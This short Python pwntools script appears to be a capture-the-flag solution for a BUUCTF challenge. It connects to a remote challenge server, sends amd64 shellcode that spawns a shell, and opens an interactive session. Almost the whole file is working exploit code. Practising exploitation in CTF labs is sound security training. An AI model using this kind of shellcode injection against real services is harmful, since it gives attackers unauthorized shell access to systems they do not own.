from pwn import *
from LibcSearcher import *
#context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn')

#io=process('./pwn')
io=remote('node4.buuoj.cn',27859)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive


shellcode=asm(shellcraft.sh())

sl(shellcode)





ii()
